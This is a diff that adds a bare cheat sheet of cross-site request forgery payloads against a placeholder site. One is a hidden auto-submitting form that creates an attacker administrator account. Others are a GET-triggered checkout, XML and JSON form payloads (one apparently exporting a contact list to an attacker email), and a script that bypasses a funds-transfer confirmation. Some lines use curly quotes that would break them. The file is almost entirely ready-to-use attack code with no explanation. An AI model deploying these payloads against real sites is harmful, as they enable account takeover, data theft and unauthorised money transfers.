@@ -1,0 +1,97 @@
+CSRF (POST)
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8"/>
+</head>
+<body>
+
+<p>Welcome stupid.</p>
+<iframe style="width: 0px; height: 0px; visibility: hidden" name="spartaaa"></iframe>
+
+<form id="myForm" action="http://XYZ.com/administrator/index.php" method="post" target="spartaaa">
+  <input type="hidden" name="name" value="attacker1"/>
+  <input type="hidden" name="username" value="attacker1"/>
+  <input type="hidden" name="email" value="attacker@attack.com"/>
+  <input type="hidden" name="password" value="attack123"/>
+  <input type="hidden" name="password2" value="attack123"/>
+  <input type="hidden" name="gid" value="25"/>
+  <input type="hidden" name="block" value="0"/>
+  <input type="hidden" name="SendEmail" value="0"/>
+  <input type="hidden" name="id" value="0"/>
+  <input type="hidden" name="cid%5B%5D" value="0"><br>
+  <input type="hidden" name="option" value="com_user"><br>
+  <input type="hidden" name="task" value="apply"><br>
+  <input type="hidden" name="contact id" value=""><br>
+/** ….. and so on **/
+</form>
+
+<script>
+
+  document.getElementById("myForm").submit();
+
+</script>
+
+</body>
+</html>
+=====================
+
+CSRF (GET)
+
+<script>
+var i = new Image();
+i.src=”http://XYZ.com/checkout.php?itemlist=1%2C1&itemquantity=1%2C1”
+</script>
+=====================
+
+
+CSRF XML payload
+
+
+<html>
+     <body>
+        <form ENCTYPE="text/plain" action="http://XYZ.com/hhh/snip.php" method="post"> 
+        <input type="hidden" name="<foo> <html xmlns:html='http://www.w3.org/1999/xhtml'> <html:script>alert(1);</html:script> </html> </foo>">
+         <input type="submit" value="submit"> </form>
+     </body>
+  </html>
+  
+
+=========================
+
+
+CSRF JSON payload
+
+
+<html>
+     <body>
+        <form ENCTYPE="text/plain" action="http://XYZ.com/hhh/snip.php" method="post"> 
+        <input type="hidden" name="{"params":{"limit":20,"and":false,"filters":[],"excluded_contacts":[]},"fields":["First Name","Last Name","Email Address","Title","Notes","Organization","Street","City","State","Tags","Zip Code","Phone Number","Gender","Event ID","Event Title","VIP","Twitter Handle","Twitter URL","Twitter Followers","Twitter Following","Facebook Name","Facebook URL","Facebook Friends","Instagram Handle","Instagram URL","Instagram Followers","Instagram Following","Website","Date Added","Unsubscribed"],"recipient":"myemail+2" value='@gmail.com'>
+         <input type="submit" value="submit"> </form>
+     </body>
+  </html>
+  
+ ======================
+
+CSRF (bypass confirmaiton box)
+ 
+ <html>
+	<body>
+	<script>
+	var req1 = new XMLHttpRequest();
+	req1.onreadystatechange = function()
+	{	
+		if(req1.readystate == 4  && req1.status == 200)
+		{
+		     req2 = new XMLHttpRequest();
+		     req2.open(“POST”, “http://XYZ.com/attack?Screen=32&menu=900”, false);
+		     req2.setRequestHeader(“Content-type”, “application/x-www-form-urlencoded”);
+		     req2.send(“transferFunds=CONFIRM”);
+		}
+	}	
+	req1.open(“GET”, “http://XYZ.com/attack?user=amr&moneytransfer=4000”, false);
+	req1.send();
+	</script>
+	</body>
+</html>
